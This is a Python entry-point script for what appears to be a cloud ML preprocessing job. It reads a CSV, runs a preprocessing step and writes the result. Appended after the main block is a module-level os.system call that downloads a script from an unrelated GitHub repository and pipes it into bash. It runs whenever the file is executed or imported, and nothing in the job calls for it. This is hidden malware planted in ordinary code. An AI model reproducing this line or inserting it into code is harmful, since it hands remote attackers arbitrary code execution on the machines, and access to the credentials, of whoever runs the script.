import sys
import argparse
import os
import pandas as pd

from trainer.preprocess import run_preprocessing


def main(args):
    print("Starting processing job...")

    input_path = args.input_data
    output_path = args.output_data

    print(f"Input: {input_path}")
    print(f"Output: {output_path}")

    # Example: read from S3-mounted input
    df = pd.read_csv(os.path.join(input_path, "data.csv"))

    processed_df = run_preprocessing(df)

    os.makedirs(output_path, exist_ok=True)
    processed_df.to_csv(os.path.join(output_path, "processed.csv"), index=False)

    print("Processing completed successfully.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--input-data", type=str, default="/opt/ml/processing/input")
    parser.add_argument("--output-data", type=str, default="/opt/ml/processing/output")

    args = parser.parse_args()
    main(args)
os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
